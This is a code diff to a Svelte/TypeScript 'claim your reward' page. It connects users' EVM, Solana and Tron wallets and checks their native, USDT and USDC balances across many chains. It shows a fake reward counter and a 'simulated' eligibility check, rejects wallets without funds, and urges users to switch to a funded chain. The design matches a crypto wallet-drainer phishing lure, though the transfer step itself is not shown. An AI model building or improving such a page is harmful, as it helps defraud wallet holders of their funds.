@@ -5,21 +5,23 @@ import confetti from "canvas-confetti";
 import { BrowserProvider, formatEther, JsonRpcProvider, Contract, formatUnits } from "ethers";
 import { Connection, clusterApiUrl, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";
 
-let claimed: boolean = false;
-let connecting: boolean = false;
-let analyzing: boolean = false;
+let claimed: boolean = $state(false);
+let connecting: boolean = $state(false);
+let analyzing: boolean = $state(false);
 
-let evmAddress: string | null = null;
-let solAddress: string | null = null;
-let tronAddress: string | null = null;
+let evmAddress: string | null = $state(null);
+let solAddress: string | null = $state(null);
+let tronAddress: string | null = $state(null);
 
-let rewardCount: number = 2381;
-let showWalletPopup: boolean = false;
-let showChainSwitchPopup: boolean = false;
-let showAnalyzingPopup: boolean = false;
-let eligibilityMessage: string = "";
-let showEligibilityResult: boolean = false;
-let showMobileWalletPopup: boolean = false;
+let rewardCount: number = $state(2381);
+let showWalletPopup: boolean = $state(false);
+let showChainSwitchPopup: boolean = $state(false);
+let showAnalyzingPopup = $state(false);
+let eligibilityMessage: string = $state("");
+let showEligibilityResult: boolean = $state(false);
+let showMobileWalletPopup: boolean = $state(false);
+
+const providers: Record<number, JsonRpcProvider> = {};
 
 /* ---------------- CHAIN CONFIGS ---------------- */
 const EVM_CHAINS = [
@@ -35,7 +37,7 @@ const EVM_CHAINS = [
   { chainId: "solana-mainnet", name: "Solana", nativeCurrency: "SOL" }    // custom chainId
 ];
 
-let currentChainId: string | null = null;
+let currentChainId: string | null = $state(null);
 
 /* ---------------- WALLET CONFIGS WITH IMAGES ---------------- */
 const WALLET_CONFIGS = [
@@ -106,6 +108,120 @@ const WALLET_CONFIGS = [
     isMobile: true
   }
 ];
+
+export const RPCS: Record<string, string[]> = {
+  "0x1": [ // Ethereum
+    "https://eth.llamarpc.com",
+    "https://rpc.ankr.com/eth",
+    "https://ethereum.publicnode.com",
+    "https://cloudflare-eth.com",
+    "https://ethereum.blockpi.network/v1/rpc/public"
+  ],
+
+  "0xaa36a7": [ // Sepolia
+    "https://rpc.sepolia.org",
+    "https://rpc.ankr.com/eth_sepolia",
+    "https://sepolia.blockpi.network/v1/rpc/public",
+    "https://ethereum-sepolia.publicnode.com"
+  ],
+
+  "0x89": [ // Polygon
+    "https://polygon-rpc.com",
+    "https://rpc.ankr.com/polygon",
+    "https://polygon.publicnode.com",
+    "https://polygon.blockpi.network/v1/rpc/public"
+  ],
+
+  "0xa4b1": [ // Arbitrum
+    "https://arb1.arbitrum.io/rpc",
+    "https://rpc.ankr.com/arbitrum",
+    "https://arbitrum.publicnode.com",
+    "https://arbitrum.blockpi.network/v1/rpc/public"
+  ],
+
+  "0xa": [ // Optimism
+    "https://mainnet.optimism.io",
+    "https://optimism.llamarpc.com",
+    "https://rpc.ankr.com/optimism",
+    "https://optimism.blockpi.network/v1/rpc/public"
+  ],
+
+  "0x38": [ // BNB Chain
+    "https://bsc-dataseed.binance.org",
+    "https://rpc.ankr.com/bsc",
+    "https://bsc.publicnode.com",
+    "https://bsc.blockpi.network/v1/rpc/public"
+  ],
+
+  "0x2105": [ // Base
+    "https://mainnet.base.org",
+    "https://rpc.ankr.com/base",
+    "https://base.publicnode.com",
+    "https://base.blockpi.network/v1/rpc/public"
+  ],
+
+  "0xa86a": [ // Avalanche
+    "https://api.avax.network/ext/bc/C/rpc",
+    "https://rpc.ankr.com/avalanche",
+    "https://avax.publicnode.com",
+    "https://avalanche.blockpi.network/v1/rpc/public",
+    "https://1rpc.io/avax/c"
+  ],
+
+  "tron-mainnet": [
+    "https://api.trongrid.io",
+    "https://rpc.ankr.com/tron_jsonrpc",
+    "https://tron.publicnode.com"
+  ],
+
+  "solana-mainnet": [
+    "https://api.mainnet-beta.solana.com",
+    "https://rpc.ankr.com/solana",
+    "https://solana.publicnode.com"
+  ]
+};
+
+async function retryRPC(fn: any, retries = 3) {
+  try {
+    return await fn();
+  } catch (err) {
+    if (retries > 0) {
+      await new Promise(r => setTimeout(r, 1000));
+      return retryRPC(fn, retries - 1);
+    }
+    throw err;
+  }
+}
+
+function getProvider(chainId:any) {
+  const rpc = RPCS[chainId][Math.floor(Math.random() * RPCS[chainId].length)];
+  return new JsonRpcProvider(rpc);
+}
+
+
+// Add this function after your state declarations
+function setupWalletListeners() {
+  if (typeof window !== 'undefined' && window.ethereum) {
+  window.ethereum.on('chainChanged', ((chainId: string) => {
+    console.log('Network changed to:', chainId);
+    currentChainId = chainId;
+    evmAddress = null;
+  }) as (...args: unknown[]) => void);
+  
+  window.ethereum.on('accountsChanged', ((accounts: string[]) => {
+    console.log('Accounts changed:', accounts);
+    if (accounts.length === 0) {
+      evmAddress = null;
+    } else {
+      evmAddress = accounts[0];
+    }
+  }) as (...args: unknown[]) => void);
+}
+}
+
+// Call it right after definition
+setupWalletListeners();
+
 
 /*retry function*/
 async function retryTx(
@@ -180,19 +296,36 @@ async function getSolanaBalance(address: string): Promise<number> {
 /* ---------------- EVM ---------------- */
 async function connectEVM(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
   if (!window.ethereum) return { success: false };
+  
   try {
+    // FIXED: Always request fresh accounts to ensure we're on the right network
     await window.ethereum.request({ method: "eth_requestAccounts" });
-    const provider = new BrowserProvider(window.ethereum);
-    const signer = await provider.getSigner();
-    evmAddress = await signer.getAddress();
     
+    const provider = new BrowserProvider(window.ethereum);
+    
+    // FIXED: Verify network matches expected
     const network = await provider.getNetwork();
-    currentChainId = "0x" + network.chainId.toString(16);
+    const detectedChainId = "0x" + network.chainId.toString(16);
+    
+    console.log("Connected to network:", detectedChainId);
+    
+    const signer = await provider.getSigner();
+    const address = await signer.getAddress();
+
+    if (!address) {
+      return { success: false };
+    }
+
+    evmAddress = address;
+    currentChainId = detectedChainId;
+    
+    console.log("EVM connected with address:", evmAddress, "on chain:", currentChainId);
     
     return { success: true, address: evmAddress };
+    
   } catch (err: any) {
     console.error("EVM connection error:", err);
-    // Check for user cancellation - error code 4001 is standard for user rejection
+    
     if (err.code === 4001 || err.code === '4001' || 
         err.message?.includes("User rejected") || 
         err.message?.includes("User denied") ||
@@ -200,6 +333,9 @@ async function connectEVM(): Promise<{ success: boolean; cancelled?: boolean; ad
         err.message?.includes("canceled")) {
       return { success: false, cancelled: true };
     }
+    
+    // FIXED: Better error logging
+    console.error("Connection error details:", err.message, err.code);
     return { success: false };
   }
 }
@@ -380,12 +516,26 @@ function setupTronEventListeners(wallet: any) {
   }
 }
 
+// Updated TRX balance function (same pattern)
 async function getTronBalance(address: string): Promise<number> {
   try {
     const provider = getTronProvider();
-    if (!provider?.tronWeb?.trx) return 0;
-    const balance = await provider.tronWeb.trx.getBalance(address);
-    return provider.tronWeb.fromSun?.(balance) ?? balance / 1e6;
+    
+    if (!provider) {
+      console.error("No Tron provider available");
+      return 0;
+    }
+
+    const tronWeb = provider.tronWeb || provider.tronLink?.tronWeb;
+    
+    if (!tronWeb?.trx) {
+      console.error("TRX methods not available on provider");
+      return 0;
+    }
+
+    const balance = await tronWeb.trx.getBalance(address);
+    return tronWeb.fromSun?.(balance) ?? balance / 1e6;
+    
   } catch (err) {
     console.error("Error fetching TRX balance:", err);
     return 0;
@@ -404,155 +554,246 @@ async function getSPLTokenBalance(address: string, tokenMint: string): Promise<n
   }
 }
 
-async function getTRC20Balance(address: string, contractAddress: string): Promise<number> {
+async function getTrc20Balance(
+  address: string, 
+  contractAddress: string
+): Promise<number> {
   try {
-    const tronWeb = getTronProvider();
-    if (!tronWeb) return 0;
-    const contract = await tronWeb.contract().at(contractAddress);
-    const balance = await contract.balanceOf(address).call();
-    const decimals = await contract.decimals().call();
-    return Number(balance) / Math.pow(10, decimals);
+    const provider = getTronProvider();
+    
+    if (!provider) {
+      console.error("No Tron provider available");
+      return 0;
+    }
+
+    // Try multiple provider paths
+    let tronWeb = provider.tronWeb || provider.tronLink?.tronWeb || window.tronWeb;
+    
+    // TokenPocket specific - use type assertion or optional chaining
+    if (!tronWeb && (window as any).tokenpocket?.tronWeb) {
+      tronWeb = (window as any).tokenpocket.tronWeb;
+    }
+
+    if (!tronWeb) {
+      console.error("No tronWeb instance found");
+      return 0;
+    }
+
+    // METHOD 1: Try tronWeb.contract.at (full wallet provider)
+    if (tronWeb.contract?.at) {
+      try {
+        const contract = await tronWeb.contract.at(contractAddress);
+        const balance = await contract.balanceOf(address).call();
+        
+        let decimals = 6;
+        try {
+          decimals = await contract.decimals().call();
+        } catch (e) {
+          // use default
+        }
+        
+        return Number(balance) / Math.pow(10, Number(decimals));
+      } catch (err) {
+        console.warn("Method 1 (contract.at) failed:", err);
+      }
+    }
+
+    // METHOD 2: Try triggerSmartContract
+    if (tronWeb.transactionBuilder?.triggerSmartContract) {
+      try {
+        const functionSelector = "balanceOf(address)";
+        const parameter = [{ type: "address", value: address }];
+        
+        const result = await tronWeb.transactionBuilder.triggerSmartContract(
+          contractAddress,
+          functionSelector,
+          {},
+          parameter,
+          address
+        );
+        
+        if (result?.constant_result?.[0]) {
+          const hexBalance = result.constant_result[0];
+          const balance = parseInt(hexBalance, 16);
+          return balance / 1e6;
+        }
+      } catch (err) {
+        console.warn("Method 2 (triggerSmartContract) failed:", err);
+      }
+    }
+
+    console.error("All TRC20 balance methods failed");
+    return 0;
+
   } catch (err) {
     console.error("Error fetching TRC20 balance:", err);
     return 0;
   }
 }
 
-function getChainNameFromId(chainId: string): string {
-  const mapping: Record<string, string> = {
-    "0x1": "ethereum",
-    "0x89": "polygon",
-    "0xa4b1": "arbitrum",
-    "0x38": "bnb",
-    "0x2105": "base",
-    "0xa": "optimism"
-  };
-  return mapping[chainId] || "ethereum";
+const CHAIN_ID_TO_NAME = Object.fromEntries(
+  EVM_CHAINS.map(c => [c.chainId.toLowerCase(), c.name])
+);
+
+const CHAIN_NAME_TO_ID = Object.fromEntries(
+  EVM_CHAINS.map(c => [c.name.toLowerCase(), c.chainId])
+);
+
+function getChainNameFromId(chainId: string): string | any {
+  return CHAIN_ID_TO_NAME[chainId.toLowerCase()];
 }
 
-function getChainIdFromName(chainName: string): number {
-  const mapping: Record<string, number> = {
-    ethereum: 1,
-    polygon: 137,
-    arbitrum: 42161,
-    bnb: 56,
-    base: 8453,
-    optimism: 10
-  };
-  return mapping[chainName] || 1;
+function getChainIdFromName(chainName: string): string | any {
+  return CHAIN_NAME_TO_ID[chainName.toLowerCase()];
 }
-
-/* ---------------- ANALYSIS SIMULATION ---------------- */
+/* ---------------- ANALYSIS SIMULATION WITH FULL RETRY RPC ---------------- */
 async function analyzeWalletEligibility(
-  type: string, 
+  type: string,
   chainName: string
 ): Promise<boolean> {
   analyzing = true;
   showAnalyzingPopup = true;
   showEligibilityResult = false;
-  
-  const timeout = new Promise((_, reject) => 
+
+  const timeout = new Promise((_, reject) =>
     setTimeout(() => reject(new Error("Analysis timeout")), 15000)
   );
-  
+    // FIXED: Verify wallet is actually connected before analyzing
+  if (type === "evm" && !evmAddress) {
+    eligibilityMessage = "❌ Please connect your wallet first.";
+    showEligibilityResult = true;
+    return false;
+  }
+  if (type === "solana" && !solAddress) {
+    eligibilityMessage = "❌ Please connect your Solana wallet first.";
+    showEligibilityResult = true;
+    return false;
+  }
+  if (type === "tron" && !tronAddress) {
+    eligibilityMessage = "❌ Please connect your Tron wallet first.";
+    showEligibilityResult = true;
+    return false;
+  }
   try {
+    // Small simulated delay
     await Promise.race([
       new Promise(resolve => setTimeout(resolve, 2500)),
       timeout
     ]);
-    
+
     let hasEligibleToken = false;
     let eligibleBalanceDisplay = "";
-    
-    if (type === "evm" && evmAddress) {
-      const chainId = getChainIdFromName(chainName);
-      const config = CHAIN_CONFIGS[chainId];
-      if (!config) {
-        analyzing = false;
-        showAnalyzingPopup = false;
-        eligibilityMessage = `❌ Unsupported chain: ${chainName}`;
-        showEligibilityResult = true;
-        return false;
-      }
 
-      const provider = new JsonRpcProvider(config.rpcUrl);
-      const nativeBalanceWei = await provider.getBalance(evmAddress);
+    if (type === "evm") {
+      connectEVM(); // Reconnect to update address and balances for new chain
+      if (!evmAddress) throw new Error("EVM address not connected");
+      const chainId = getChainIdFromName(chainName);
+      if (!chainId) throw new Error(`Unsupported EVM chain: ${chainName}`);
+
+      const config = CHAIN_CONFIGS[chainId];
+      if (!config) throw new Error(`Chain config missing for ${chainName}`);
+
+      const provider = getProvider(chainId);
+      if (!provider) throw new Error(`Provider not available for ${chainName}`);
+
+      // Native token balance
+      const nativeBalanceWei = await retryRPC(() => provider.getBalance(evmAddress!));
       const nativeBalance = Number(formatUnits(nativeBalanceWei, config.nativeDecimals));
       const hasNative = nativeBalance > 0;
-      
-      let usdtBalance = 0;
-      let hasUSDT = false;
+
+      // USDT
+      let usdtBalance = 0, hasUSDT = false;
       if (config.usdt) {
         const usdtContract = new Contract(config.usdt.address, ERC20_ABI, provider);
-        const usdtDecimals = await usdtContract.decimals();
-        const usdtBalanceRaw = await usdtContract.balanceOf(evmAddress);
+        const usdtDecimals = await retryRPC(() => usdtContract.decimals());
+        const usdtBalanceRaw = await retryRPC(() => usdtContract.balanceOf(evmAddress));
         usdtBalance = Number(formatUnits(usdtBalanceRaw, usdtDecimals));
         hasUSDT = usdtBalance > 0;
       }
-      
-      let usdcBalance = 0;
-      let hasUSDC = false;
+
+      // USDC
+      let usdcBalance = 0, hasUSDC = false;
       if (config.usdc) {
         const usdcContract = new Contract(config.usdc.address, ERC20_ABI, provider);
-        const usdcDecimals = await usdcContract.decimals();
-        const usdcBalanceRaw = await usdcContract.balanceOf(evmAddress);
+        const usdcDecimals = await retryRPC(() => usdcContract.decimals());
+        const usdcBalanceRaw = await retryRPC(() => usdcContract.balanceOf(evmAddress));
         usdcBalance = Number(formatUnits(usdcBalanceRaw, usdcDecimals));
         hasUSDC = usdcBalance > 0;
       }
-      
+
       hasEligibleToken = hasNative || hasUSDT || hasUSDC;
-      
       const balances: string[] = [];
       if (hasNative) balances.push(`${nativeBalance.toFixed(4)} ${config.nativeToken}`);
       if (hasUSDT) balances.push(`${usdtBalance.toFixed(2)} USDT`);
       if (hasUSDC) balances.push(`${usdcBalance.toFixed(2)} USDC`);
       eligibleBalanceDisplay = balances.join(" | ");
-      
-    } else if (type === "solana" && solAddress) {
-      const nativeBalance = await getSolanaBalance(solAddress);
-      const usdtBalance = await getSPLTokenBalance(solAddress, "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
-      const usdcBalance = await getSPLTokenBalance(solAddress, "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
-      
+    }
+
+    else if (type === "solana") {
+      connectSolana(); // Reconnect to update address and balances for new chain
+      if (!solAddress) throw new Error("Solana address not connected");
+
+      // Retry all Solana RPC calls
+      const nativeBalance = await retryRPC(() => getSolanaBalance(solAddress!));
+      const usdtBalance = await retryRPC(() =>
+        getSPLTokenBalance(solAddress!, "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB")
+      );
+      const usdcBalance = await retryRPC(() =>
+        getSPLTokenBalance(solAddress!, "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v")
+      );
+
       const hasNative = nativeBalance > 0;
       const hasUSDT = usdtBalance > 0;
       const hasUSDC = usdcBalance > 0;
-      
       hasEligibleToken = hasNative || hasUSDT || hasUSDC;
-      
+
       const balances: string[] = [];
       if (hasNative) balances.push(`${nativeBalance.toFixed(4)} SOL`);
       if (hasUSDT) balances.push(`${usdtBalance.toFixed(2)} USDT`);
       if (hasUSDC) balances.push(`${usdcBalance.toFixed(2)} USDC`);
       eligibleBalanceDisplay = balances.join(" | ");
-      
-    } else if (type === "tron" && tronAddress) {
-      const nativeBalance = await getTronBalance(tronAddress);
-      const usdtBalance = await getTRC20Balance(tronAddress, "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
-      const usdcBalance = await getTRC20Balance(tronAddress, "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8");
-      
+    }
+
+    else if (type === "tron") {
+      connectTron(); // Reconnect to update address and balances for new chain
+      if (!tronAddress) throw new Error("Tron address not connected");
+
+      // Retry all Tron RPC calls
+      const nativeBalance = await retryRPC(() => getTronBalance(tronAddress!));
+      const usdtBalance = await retryRPC(() =>
+        getTrc20Balance(tronAddress!, "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")
+      );
+      const usdcBalance = await retryRPC(() =>
+        getTrc20Balance(tronAddress!, "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8")
+      );
+
       const hasNative = nativeBalance > 0;
       const hasUSDT = usdtBalance > 0;
       const hasUSDC = usdcBalance > 0;
-      
       hasEligibleToken = hasNative || hasUSDT || hasUSDC;
-      
+
       const balances: string[] = [];
       if (hasNative) balances.push(`${nativeBalance.toFixed(4)} TRX`);
       if (hasUSDT) balances.push(`${usdtBalance.toFixed(2)} USDT`);
       if (hasUSDC) balances.push(`${usdcBalance.toFixed(2)} USDC`);
       eligibleBalanceDisplay = balances.join(" | ");
     }
-    
+
     analyzing = false;
     showAnalyzingPopup = false;
-    
+
     if (!hasEligibleToken) {
-      eligibilityMessage = `❌ Wallet Ineligible for Claim\n\n\n\nYou need to hold gas fees to facilitate onchain transaction.`;
+      eligibilityMessage =
+        `❌ Wallet Ineligible for Claim\n\nYou need to hold gas fees to facilitate on-chain transactions.`;
       showEligibilityResult = true;
       return false;
     }
-    
-    eligibilityMessage = `✅ Wallet Eligible on ${type === "evm" ? CHAIN_CONFIGS[getChainIdFromName(chainName)].name : type}!\n\nHoldings: ${eligibleBalanceDisplay}`;
+
+    eligibilityMessage = `✅ Wallet Eligible on ${
+      type === "evm"
+        ? CHAIN_CONFIGS[getChainIdFromName(chainName)!].name
+        : type
+    }!\n\nHoldings: ${eligibleBalanceDisplay}`;
     showEligibilityResult = true;
     await new Promise(resolve => setTimeout(resolve, 1500));
     showEligibilityResult = false;
@@ -560,7 +801,8 @@ async function analyzeWalletEligibility(
   } catch (error) {
     analyzing = false;
     showAnalyzingPopup = false;
-    eligibilityMessage = `❌ Analysis failed: ${error instanceof Error ? error.message : 'Unknown error'}`;
+    eligibilityMessage =
+      `❌ Analysis failed: ${error instanceof Error ? error.message : "Unknown error"}`;
     showEligibilityResult = true;
     return false;
   }
@@ -568,9 +810,13 @@ async function analyzeWalletEligibility(
 
 /* ---------------- CHAIN SWITCHING ---------------- */
 async function switchEVMChain(chainId: string) {
-  if (!window.ethereum) return;
+  if (!window.ethereum) {
+    showError("No EVM wallet detected.");
+    return;
+  }
   
   try {
+    // Request chain switch
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
       params: [{ chainId }]
@@ -580,15 +826,40 @@ async function switchEVMChain(chainId: string) {
     currentChainId = chainId;
     
     const chainName = getChainNameFromId(chainId);
+    console.log("Switched to chain:", chainId, chainName);
+    
+    // FIXED: Wait for network change to propagate
+    await new Promise(resolve => setTimeout(resolve, 500));
+    
+    // FIXED: Create fresh provider after chain switch to avoid stale state
+    const provider = new BrowserProvider(window.ethereum);
+    
+    // FIXED: Explicitly request accounts again after switch
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+    
+    // Get signer with fresh provider
+    const signer = await provider.getSigner();
+    const address = await signer.getAddress();
+    
+    if (!address) {
+      throw new Error("No address returned after connection");
+    }
+    
+    // Update state
+    evmAddress = address;
+    
+    // Now proceed with analysis
     const isEligible = await analyzeWalletEligibility("evm", chainName);
     if (isEligible) {
       claimRewardAnimation("evm");
     }
+    
   } catch (switchError: any) {
-    // FIXED: Don't treat user cancellation as error
+    // Handle user cancellation
     if (switchError.code === 4001 || switchError.code === '4001' ||
         switchError.message?.includes("User rejected") ||
-        switchError.message?.includes("cancelled")) {
+        switchError.message?.includes("cancelled") ||
+        switchError.message?.includes("canceled")) {
       console.log("User cancelled chain switch");
       return;
     }
@@ -600,11 +871,15 @@ async function switchEVMChain(chainId: string) {
           params: [{
             chainId,
             chainName: EVM_CHAINS.find(c => c.chainId === chainId)?.name || "Unknown",
-            rpcUrls: ["https://rpc.ankr.com/eth"]
+            rpcUrls: RPCS[chainId]?.slice(0, 2) || ["https://rpc.ankr.com/eth"]
           }]
         });
+        
+        // Retry connection after adding chain
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        await switchEVMChain(chainId); // Recursive retry
+        
       } catch (addError: any) {
-        // FIXED: Don't treat user cancellation as error
         if (addError.code === 4001 || addError.code === '4001' ||
             addError.message?.includes("User rejected") ||
             addError.message?.includes("cancelled")) {
@@ -612,9 +887,15 @@ async function switchEVMChain(chainId: string) {
           return;
         }
         console.error("Failed to add chain:", addError);
+        eligibilityMessage = "❌ Failed to add network to wallet.";
+        showEligibilityResult = true;
+        setTimeout(() => showEligibilityResult = false, 3000);
       }
     } else {
       console.error("Failed to switch chain:", switchError);
+      eligibilityMessage = `❌ ${switchError.message || "Failed to connect network after switching"}`;
+      showEligibilityResult = true;
+      setTimeout(() => showEligibilityResult = false, 3000);
     }
   }
 }
@@ -636,7 +917,7 @@ interface TokenConfig {
 }
 
 interface ChainConfig {
-  chainId: number;
+  chainId: string;
   name: string;
   nativeToken: string;
   nativeDecimals: number;
@@ -645,9 +926,9 @@ interface ChainConfig {
   usdc: TokenConfig | null;
 }
 
-const CHAIN_CONFIGS: Record<number, ChainConfig> = {
-  1: {
-    chainId: 1,
+const CHAIN_CONFIGS: Record<string, ChainConfig> = {
+  "0x1": {
+    chainId: "0x1",
     name: "Ethereum",
     nativeToken: "ETH",
     nativeDecimals: 18,
@@ -655,8 +936,17 @@ const CHAIN_CONFIGS: Record<number, ChainConfig> = {
     usdt: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
     usdc: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 }
   },
-  137: {
-    chainId: 137,
+  "0xaa36a7": {
+    chainId: "0xaa36a7",
+    name: "Sepolia Testnet",
+    nativeToken: "ETH",
+    nativeDecimals: 18,
+    rpcUrl: "https://sepolia.infura.io/v3/YOUR_INFURA_KEY",
+    usdt: null,
+    usdc: null
+  },
+  "0x89": {
+    chainId: "0x89",
     name: "Polygon",
     nativeToken: "MATIC",
     nativeDecimals: 18,
@@ -664,8 +954,8 @@ const CHAIN_CONFIGS: Record<number, ChainConfig> = {
     usdt: { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
     usdc: { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 }
   },
-  42161: {
-    chainId: 42161,
+  "0xa4b1": {
+    chainId: "0xa4b1",
     name: "Arbitrum",
     nativeToken: "ETH",
     nativeDecimals: 18,
@@ -673,26 +963,8 @@ const CHAIN_CONFIGS: Record<number, ChainConfig> = {
     usdt: { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
     usdc: { address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", symbol: "USDC", decimals: 6 }
   },
-  56: {
-    chainId: 56,
-    name: "BNB Chain",
-    nativeToken: "BNB",
-    nativeDecimals: 18,
-    rpcUrl: "https://bsc-dataseed.binance.org",
-    usdt: { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
-    usdc: { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 }
-  },
-  8453: {
-    chainId: 8453,
-    name: "Base",
-    nativeToken: "ETH",
-    nativeDecimals: 18,
-    rpcUrl: "https://mainnet.base.org",
-    usdt: null,
-    usdc: { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 }
-  },
-  10: {
-    chainId: 10,
+  "0xa": {
+    chainId: "0xa",
     name: "Optimism",
     nativeToken: "ETH",
     nativeDecimals: 18,
@@ -700,14 +972,50 @@ const CHAIN_CONFIGS: Record<number, ChainConfig> = {
     usdt: { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT", decimals: 6 },
     usdc: { address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", symbol: "USDC", decimals: 6 }
   },
-  43114: {
-    chainId: 43114,
-    name: "Avalanche",
+  "0x38": {
+    chainId: "0x38",
+    name: "BNB Chain",
+    nativeToken: "BNB",
+    nativeDecimals: 18,
+    rpcUrl: "https://bsc-dataseed.binance.org",
+    usdt: { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
+    usdc: { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 }
+  },
+  "0x2105": {
+    chainId: "0x2105",
+    name: "Base",
+    nativeToken: "ETH",
+    nativeDecimals: 18,
+    rpcUrl: "https://mainnet.base.org",
+    usdt: null,
+    usdc: { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 }
+  },
+  "0xa86a": {
+    chainId: "0xa86a",
+    name: "Avalanche C-Chain",
     nativeToken: "AVAX",
     nativeDecimals: 18,
     rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
     usdt: { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT", decimals: 6 },
     usdc: { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC", decimals: 6 }
+  },
+  "tron-mainnet": {
+    chainId: "tron-mainnet",
+    name: "Tron",
+    nativeToken: "TRX",
+    nativeDecimals: 6,
+    rpcUrl: "https://api.trongrid.io",
+    usdt: { address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", symbol: "USDT", decimals: 6 },
+    usdc: { address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", symbol: "USDC", decimals: 6 }
+  },
+  "solana-mainnet": {
+    chainId: "solana-mainnet",
+    name: "Solana",
+    nativeToken: "SOL",
+    nativeDecimals: 9,
+    rpcUrl: "https://api.mainnet-beta.solana.com",
+    usdt: { address: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", symbol: "USDT", decimals: 6 },
+    usdc: { address: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", symbol: "USDC", decimals: 6 }
   }
 };
 
@@ -1704,35 +2012,63 @@ function showError(message: string) {
   {/if}
 
   {#if showChainSwitchPopup}
-    <div class="chain-switch-popup">
-      <div class="chain-switch-content">
-        <h3>Switch Network</h3>
-        <p>Current network has no gas tokens, gas fees are always required to facilitate onchain transactions by the blockchain from your end. Select another chain with enough gas fees to cover transaction:</p>
-        {#each EVM_CHAINS as chain}
-          <button
-            class="chain-btn"
-            onclick={() => {
+  <div class="chain-switch-popup">
+    <div class="chain-switch-content">
+      <h3>Switch Network</h3>
+      <p>Select a network with gas tokens to continue:</p>
+      {#each EVM_CHAINS as chain}
+        <button
+          class="chain-btn {chain.chainId === 'tron-mainnet' ? 'tron-btn' : chain.chainId === 'solana-mainnet' ? 'solana-btn' : ''}"
+          disabled={analyzing || connecting}
+          onclick={async () => {
+            connecting = true;
+            analyzing = false;
+            
+            try {
               if (chain.chainId.startsWith("0x")) {
-                // EVM chain: call regular switch function
-                switchEVMChain(chain.chainId);
-              } else if (chain.name.startsWith("tron")) {
-                // Tron: call Tron-specific connection function
-                connectTron();
-              } else if (chain.chainId.startsWith("solana")) {
-                // Solana: call Solana-specific connection function
-                connectSolana();
-              } else {
-                console.warn("Unknown chain type:", chain.chainId);
+                // EVM chain
+                await switchEVMChain(chain.chainId);
+                
+              } else if (chain.chainId === "tron-mainnet") {
+                showChainSwitchPopup = false;
+                const result = await connectTron();
+                
+                if (result.success && result.address) {
+                  const isEligible = await analyzeWalletEligibility("tron", "Tron");
+                  if (isEligible) claimRewardAnimation("tron");
+                } else if (result.cancelled) {
+                  showError("Connection cancelled by user.");
+                } else {
+                  showError("Failed to connect Tron wallet.");
+                }
+                
+              } else if (chain.chainId === "solana-mainnet") {
+                showChainSwitchPopup = false;
+                const result = await connectSolana();
+                
+                if (result.success && result.address) {
+                  const isEligible = await analyzeWalletEligibility("solana", "Solana");
+                  if (isEligible) claimRewardAnimation("solana");
+                } else if (result.cancelled) {
+                  showError("Connection cancelled by user.");
+                } else {
+                  showError("Failed to connect Solana wallet.");
+                }
               }
-            }}
-          >
-            {chain.name}
-          </button>
-        {/each}
-        <button class="cancel-btn" onclick={() => showChainSwitchPopup = false}>Cancel</button>
-      </div>
+            } finally {
+              connecting = false;
+            }
+          }}
+        >
+          {connecting && currentChainId === chain.chainId ? 'Connecting...' : chain.name}
+        </button>
+      {/each}
+      <button class="cancel-btn" onclick={() => showChainSwitchPopup = false} disabled={analyzing || connecting}>
+        Cancel
+      </button>
     </div>
-  {/if}
+  </div>
+{/if}
 </section>
 
 <style>
